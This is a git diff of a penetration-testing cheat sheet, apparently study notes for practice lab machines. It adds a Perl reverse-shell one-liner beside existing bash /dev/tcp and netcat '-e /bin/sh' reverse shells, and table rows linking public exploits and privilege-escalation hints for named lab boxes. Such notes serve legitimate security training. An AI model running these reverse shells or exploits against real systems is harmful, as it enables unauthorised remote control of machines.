@@ -199,7 +199,10 @@ bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1
 ```
 nc $kaliIP 80 -e /bin/sh
 ```
-
+#### perl
+```
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$KaliIP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
 ### [CyberChef](https://gchq.github.io/CyberChef/)
 a web app for encryption, encoding, compression and data analysis.
 
@@ -347,9 +350,17 @@ The most commonly used tools
 | Blackgate | Intermediate | Redis                                                          | [Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce), [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server) |                                                                                                        |
 | Bratarina | Easy         | OpenSMTPD                                                      | [OpenSMTPD 6.6.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47984)                                           |                                                                                                        |
 | Bullybox  | Intermediate | [git-dumper](https://github.com/arthaud/git-dumper#git-dumper) | [BoxBilling<=4.22.1.5 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51108)                                | `sudo`                                                                                                 |
-| Snookums  | Intermediate |                                                                | [Remote File Inclusion](https://github.com/beauknowstech/SimplePHPGal-RCE.py)                                                  | PwnKit                                                                                                 |
-| Sorcerer  | Intermediate | Dirsearch                                                      | SSH, SCP                                                                                                                       | start-stop-daemon (SUID)                                                                               |
-| Twiggy    | Intermediate | ZeroMQ ZMTP 2.0                                                | [Saltstack 3000.1 - CVE-2020-11651, CVE-2020-11652](https://github.com/Al1ex/CVE-2020-11652)                                   |                                                                                                        |
+|ClamAV|Easy||[Sendmail with clamav-milter < 0.91.2 - Remote Command Execution](https://www.exploit-db.com/exploits/4761)
+|Cockpit|Intermediate|SQL Injection||tar (SUID), edit `etc/sudoers`|
+|Codo|Easy||upload reverse shell|root's password leaked (linPEAS)|
+|Crane|Easy||[CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940?tab=readme-ov-file)|`sudo -l`, serice|
+|Exfiltrated|Easy|default creds|[CVE-2018-19422-SubrionCMS-RCE](https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE)|cron jobs, [Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution](https://github.com/UNICORDev/exploit-CVE-2021-22204)|
+|Extplorer|Intermediate|dirsearch|upload reverse shell|`id`, `debugfs`, `john`|
+|Flu|Intermediate||[ CVE-2022-26134](https://github.com/jbaines-r7/through_the_wire)|`pspy`
+|Hawat|
+| Snookums | Intermediate || [Remote File Inclusion](https://github.com/beauknowstech/SimplePHPGal-RCE.py)| PwnKit|
+| Sorcerer  | Intermediate | Dirsearch| SSH, SCP| start-stop-daemon (SUID)|
+| Twiggy    | Intermediate | ZeroMQ ZMTP 2.0| [Saltstack 3000.1 - CVE-2020-11651, CVE-2020-11652](https://github.com/Al1ex/CVE-2020-11652) ||
 | Walla     | Intermediate | default creds                                                  | [RaspAP 2.5 RCE - CVE-2020-24572](https://github.com/gerbsec/CVE-2020-24572-POC)                                               | `sudo -l`, replace python file                                                                         |
 | Wombo     | Intermediate | Redis                                                          | [Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce), [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server) |                                                                                                        |
 | ZenPhoto  | Intermediate | Dirsearch                                                      | [ZenPhoto 1.4.1.4 RCE - CVE-2011-4825](https://www.exploit-db.com/exploits/18083)                                              | [rds - CVE-2010-3904](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2010/CVE-2010-3904) |
@@ -357,17 +368,9 @@ The most commonly used tools
 - [ ] [Apex]()
 - [ ] [BitForge]()
 - [ ] [Boolean]()
-- [X] [ClamAV]()
 - [ ] [Clue]()
-- [x] [Cockpit]()
-- [X] [Easy] Codo ([writeup](/writeups/Codo.md))
-- [X] [Crane]()
-- [X] [Exfiltrated]()
-- [X] [Extplorer]()
 - [ ] [Fanatastic]()
 - [ ] [Fired]()
-- [X] [Flu]()
-- [X] [Hawat]()
 - [ ] [Hetemit]()
 - [X] [Easy] Hub ([writeup](/writeups/Hub.md))
 - [ ] [Hunit]()
